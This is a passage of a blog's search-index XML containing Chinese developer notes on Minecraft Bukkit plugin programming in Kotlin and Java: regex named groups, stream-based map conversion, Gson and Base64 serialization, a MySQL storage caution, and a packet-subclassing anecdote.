number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            Database<span class="token punctuation">.</span>selectedDB<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>Bukkit<span class="token punctuation">.</span><span class="token function">getOfflinePlayer</span><span class="token punctuation">(</span>holder<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">,</span> profile<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token comment">// 翻页操作代码片段</span><span class="token comment">// 对Deffered实例进行操作，使其在数据上传完毕后再进行翻页操作</span>Warehouse<span class="token punctuation">.</span><span class="token function">saveWarehouse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>inventory<span class="token punctuation">,</span> holder<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invokeOnCompletion</span> <span class="token punctuation">{</span>   Warehouse<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>whoClicked <span class="token keyword">as</span> Player<span class="token punctuation">,</span> holder<span class="token punctuation">.</span><span class="token function">also</span> <span class="token punctuation">{</span>it<span class="token punctuation">.</span>warehouse_page <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Coroutine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在使用SQL时的一些注意事项</title>
      <link href="/2021/07/22/be-careful-using-mysql/"/>
      <url>/2021/07/22/be-careful-using-mysql/</url>
      
        <content type="html"><![CDATA[<h2 id="尽量避免将大量数据序列化扔一个列里"><a href="#尽量避免将大量数据序列化扔一个列里" class="headerlink" title="尽量避免将大量数据序列化扔一个列里"></a>尽量避免将大量数据序列化扔一个列里</h2><p><strong>尤其是在需要频繁获取/更新这些数据的情况下</strong><br>这样一旦数据库储量到达一定级别，<strong>数据库极可能丢失数据</strong><br>神域的地牢孤剑便是前车之鉴<br><strong>储存方式</strong></p><p><a href="https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png"><img src="https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png" alt="7e8c1fed3737e6ab"></a></p><p><strong>后果</strong></p><p><a href="https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg"><img src="https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg" alt="-2bf7c04dec497124"></a></p><p><a href="https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg"><img src="https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg" alt="-3e6ca3264d9d5b3a"></a></p><p><a href="https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg"><img src="https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg" alt="54e384ac658f35d9"></a></p><p><strong>知乎</strong><br><a href="https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png"><img src="https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png" alt="1c4ec094fffaaa6a"></a><br><a href="https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png"><img src="https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png" alt="-1edc645b674852e1"></a><br><a href="https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png"><img src="https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png" alt="-5462c585fd3183db"></a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式捕获组在Java/Kotlin中的使用</title>
      <link href="/2021/07/21/regex-matcher/"/>
      <url>/2021/07/21/regex-matcher/</url>
      
        <content type="html"><![CDATA[<h2 id="传统方式：使用捕获组序数来获取捕获组捕获到的内容"><a href="#传统方式：使用捕获组序数来获取捕获组捕获到的内容" class="headerlink" title="传统方式：使用捕获组序数来获取捕获组捕获到的内容"></a>传统方式：使用捕获组序数来获取捕获组捕获到的内容</h2><p>上代码</p><pre class="line-numbers language-none"><code class="language-none">val pattern = Pattern.compile("(//d+)(//S+)")val matcher = pattern.matcher("2021BifrostCraft")if (matcher.find()) {    print(matcher.group())    print(matcher.group(1))    print(matcher.group(2))}// 输出结果是:2021BifrostCraft,2021,BifrostCraft<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但有时我们不知道Pattern中一共有多少个捕获组，也就不知道我们需要获取的捕获组的序号</p><p>这个问题一度困扰了我很久</p><p>直到我了解到命名捕获组这种做法</p><h2 id="命名捕获组"><a href="#命名捕获组" class="headerlink" title="命名捕获组"></a>命名捕获组</h2><p><strong>每个以左括号开始的捕获组，都紧跟着“?”，而后才是正则表达式。</strong></p><p>先上代码</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> pattern <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"(?&lt;number&gt;//d+)(?&lt;word&gt;//S+)"</span><span class="token punctuation">)</span><span class="token keyword">val</span> matcher <span class="token operator">=</span> pattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span><span class="token string">"2021BifrostCraft"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">print</span><span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"number"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"word"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// 输出结果是:2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样做，即使我们不知道我们的pattern里面有多少捕获组，也不知道我们需要的捕获组的序号，我们仍然能获取到我们想要得到得捕获组的内容</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用stream对map进行操作</title>
      <link href="/2021/07/21/use-stream-to-handle-map/"/>
      <url>/2021/07/21/use-stream-to-handle-map/</url>
      
        <content type="html"><![CDATA[<h1 id="使用stream对map进行操作"><a href="#使用stream对map进行操作" class="headerlink" title="使用stream对map进行操作"></a>使用stream对map进行操作</h1><p>实在是太方便了</p><p><strong>Kotlin</strong>代码:</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// 从一个Map&lt;String,String&gt;中得到一个Map&lt;String,Pattern&gt;</span><span class="token comment">// 只需一行代码</span><span class="token punctuation">(</span>it<span class="token punctuation">[</span><span class="token string">"match"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>entries<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>                        Collectors<span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">&gt;</span><span class="token operator">::</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span> e <span class="token operator">-&gt;</span>                            Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>                                e<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"[NUMBER]"</span><span class="token punctuation">,</span> <span class="token string">"&lt;value&gt;(\\d+(\\.\\d+)?)"</span><span class="token punctuation">)</span>                                    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&lt;NUMBER&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;value&gt;(\\d+(\\.\\d+)?)"</span><span class="token punctuation">)</span>                            <span class="token punctuation">)</span>                        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Java</strong>代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span>entries<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token operator">::</span><span class="token function">getKey</span><span class="token punctuation">,</span> entry <span class="token operator">-&gt;</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"[NUMBER]"</span><span class="token punctuation">,</span> <span class="token string">"&lt;value&gt;(\\d+(\\.\\d+)?)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&lt;NUMBER&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;value&gt;(\\d+(\\.\\d+)?)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化的两种常见做法</title>
      <link href="/2021/07/20/how-to-serialize/"/>
      <url>/2021/07/20/how-to-serialize/</url>
      
        <content type="html"><![CDATA[<p>最常见的做法无非两种：序列化成<strong>json</strong>或者<strong>base64</strong></p><h2 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h2><p>要将一个实例序列化成Json信息一般都需要借助<strong>外部库</strong></p><p>比较常用的库有两种：谷歌的<strong>gson</strong>，阿里的<strong>fastjson</strong></p><p>由于我接触的开发者们都比较青睐gson，而且Spigot核心甚至内置了一个gson库（虽然版本有点老了）</p><p>所以对我个人而言，使用gson进行序列化操作更加容易</p><p>只需要短短数行代码，便能轻松的序列化/反序列化一个实例</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// 序列化实例</span><span class="token keyword">val</span> string<span class="token operator">:</span> String <span class="token operator">=</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token comment">// 反序列化</span><span class="token keyword">val</span> obj<span class="token operator">:</span> Any <span class="token operator">=</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> Any<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span><span class="token comment">// 集合操作</span><span class="token keyword">val</span> str<span class="token operator">:</span> String <span class="token operator">=</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token function">arrayListOf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> list<span class="token operator">:</span> ArrayList<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">object</span> <span class="token operator">:</span> TypeToken<span class="token operator">&lt;</span>ArrayList<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但我最开始利用gson序列化的都是一些里面都塞的是原生数据类型的集合或者Map，所以理所当然的认为gson可以直接序列化所有类型的实例</p><p>于是我吃了个大亏</p><p>在尝试序列化我自己写的类实例化出来的实例时，我发现它们序列化出来都是{}，这导致了我之后反序列化操作造成的<strong>NullPointerException</strong></p><p>要命的是，因为这个空指针，我各种检查自己的代码，检查到怀疑人生，所有的非空检测都做了，就还是会抛出这个异常</p><p>说好的<strong>Kotlin</strong>干翻空指针呢！（笑）</p><p>直到最后的最后，我检查了数据库中储存的序列化之后储存的数据，才发现这个错误</p><p><strong>原来，Gson序列化自己建的类的实例，是需要做一些操作，将这些类注册到Gson实例中的</strong></p><p>具体操作</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// 代码来自 TabooLib io.izzel.taboolib.kotlin.Serializer</span><span class="token comment">// 注册对应类的TypeHierarchAdapter才能序列化这个类的实例</span>    <span class="token keyword">val</span> gson <span class="token operator">=</span> <span class="token function">GsonBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setPrettyPrinting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">excludeFieldsWithoutExposeAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">also</span> <span class="token punctuation">{</span>        it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>Location<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">,</span> <span class="token function">TypeLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>ItemStack<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">,</span> <span class="token function">TypeItemStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>SecuredFile<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">,</span> <span class="token function">TypeSecuredFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>YamlConfiguration<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">,</span> <span class="token function">TypeYamlConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        SerializerAdapter<span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token operator">-&gt;</span>            it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!!</span><span class="token comment">// TypeAdapter</span><span class="token comment">// 这里以Location的TypeAdapter为例</span>    <span class="token keyword">class</span> TypeLocation <span class="token operator">:</span> JsonSerializer<span class="token operator">&lt;</span>Location<span class="token operator">&gt;</span><span class="token punctuation">,</span> JsonDeserializer<span class="token operator">&lt;</span>Location<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">serialize</span><span class="token punctuation">(</span>a<span class="token operator">:</span> Location<span class="token punctuation">,</span> p1<span class="token operator">:</span> Type<span class="token punctuation">,</span> p2<span class="token operator">:</span> JsonSerializationContext<span class="token punctuation">)</span><span class="token operator">:</span> JsonElement <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">JsonObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">also</span> <span class="token punctuation">{</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>world<span class="token operator">!!</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>x<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>y<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>z<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"yaw"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>yaw<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"pitch"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>pitch<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>a<span class="token operator">:</span> JsonElement<span class="token punctuation">,</span> p1<span class="token operator">:</span> Type<span class="token operator">?</span><span class="token punctuation">,</span> p2<span class="token operator">:</span> JsonDeserializationContext<span class="token punctuation">)</span><span class="token operator">:</span> Location <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">Location</span><span class="token punctuation">(</span>                Bukkit<span class="token punctuation">.</span><span class="token function">getWorld</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asString<span class="token punctuation">)</span><span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asDouble<span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asDouble<span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asDouble<span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"yaw"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asFloat<span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"pitch"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asFloat            <span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在GsonBuilder中注册类和Adapter后构造出来的Gson实例便可以序列化/反序列化对应的类</p><p>操作算不上复杂，但也不算轻松</p><p>对于只是想把实例存数据库的我来说，这些操作还是有些繁琐了</p><p>所以，如果只是想把实例扔数据库里储存，使用<strong>Base64</strong>更加合适</p><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>base64不需要像gson那样做繁琐的操作，就可以对一个实例进行轻松的序列化/反序列化操作</p><p>并且，在现有的Java版本中，使用Base64不再需要借助任何外部库</p><p><strong>唯一的缺点是，它序列出来的字符串并不像Json字符串，可以用肉眼看出来其中蕴含的信息</strong></p><p>但在数据库操作中，我们并不需要让用户知道这些字符的含义，并修改它们</p><p>所以，用它序列化实例再扔进SQL实在是再合适不过了</p><p>上代码</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// 代码来自SacredHUD</span><span class="token comment">// Base64 encode</span><span class="token keyword">fun</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> BitMapData<span class="token punctuation">.</span>Personal<span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token function">toBase64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> String <span class="token punctuation">{</span>    <span class="token function">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> byteArrayOutputStream <span class="token operator">-&gt;</span>        <span class="token function">BukkitObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> bukkitObjectOutputStream <span class="token operator">-&gt;</span>            bukkitObjectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// Base64 decode</span><span class="token annotation builtin">@Suppress</span><span class="token punctuation">(</span><span class="token string">"UNCHECKED_CAST"</span><span class="token punctuation">)</span><span class="token keyword">fun</span> String<span class="token punctuation">.</span><span class="token function">base64ToBitmapData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> BitMapData<span class="token punctuation">.</span>Personal<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token function">ByteArrayInputStream</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> byteArrayInputStream <span class="token operator">-&gt;</span>        <span class="token function">BukkitObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> bukkitObjectInputStream <span class="token operator">-&gt;</span>            <span class="token keyword">return</span> bukkitObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> BitMapData<span class="token punctuation">.</span>Personal<span class="token operator">&gt;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
            <tag> 外部库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NMS蛋疼的非法包检测</title>
      <link href="/2021/07/18/nms-packet-name-check/"/>
      <url>/2021/07/18/nms-packet-name-check/</url>
      
        <content type="html"><![CDATA[<p>故事起因大概是这样的…<br>昨天我需要做一个拦截本插件以外所有Actionbar信息的功能<br>最开始我自然而然的想到了监听<strong>PacketPlayOutChat</strong>数据包，通过判断它的内容是否符合条件来辨别这个Actionbar是否为我插件发送的Actionbar信息<br><strong>但这样实在是太low了</strong>，我不喜欢利用其发送的文本内容进行判断。就像做GUI，比起判断GUI的title，当然是判断InventoryHolder的做法更好。<br>于是我转向研究能否给这个数据包本身加上一个标记，进而方便我们辨识这个数据包<br>于是我想到了让一个类继承PacketPlayOutChat，用这个类来发包的办法<br>并且利用Taboolib的<strong>ASMVersionControl</strong>，还可以实现这个对这个类的版本控制<br>只需要对监听到的数据包的类进行判断，便可以轻易辨别<br>当时我想到的时候感觉自己真是牛逼坏了<br>大致做法如下<br><strong>继承PacketPlayOutChat</strong></p><pre class="line-numbers language-none"><code class="language-none">class LegalActionBarPacket(iChatBaseComponent: IChatBaseComponent, chatMessageType: ChatMessageType, uuid: UUID) : PacketPlayOutChat(iChatBaseComponent,chatMessageType,uuid)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>ASMVersionControl</strong></p><pre class="line-numbers language-none"><code class="language-none">val legalPacketClass = AsmVersionControl.createNMS("me.asgard.coldrain.hud.module.nms.LegalActionBarPacket").mapping().translate(SacredHUD.plugin) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>数据包监听</strong></p><pre class="line-numbers language-none"><code class="language-none">@TPacket(type = TPacket.Type.SEND)private fun send(player: Player, packet: Packet): Boolean {    if (packet.equals("PacketPlayOutChat")            &amp;&amp; packet.read("b").reflex&lt;Byte&gt;("d") == 2.toByte()            &amp;&amp; packet.get().javaClass != legalPacketClass){        return false    }    return true}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我洋洋得意的编译出来扔进服务器里，对自己发了一个legalPacket<br>可笑的是，这个我取名的legalPacket，被服务端认为是一个ilegal packet，我直接掉线</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Bukkit </tag>
            
            <tag> TabooLib </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
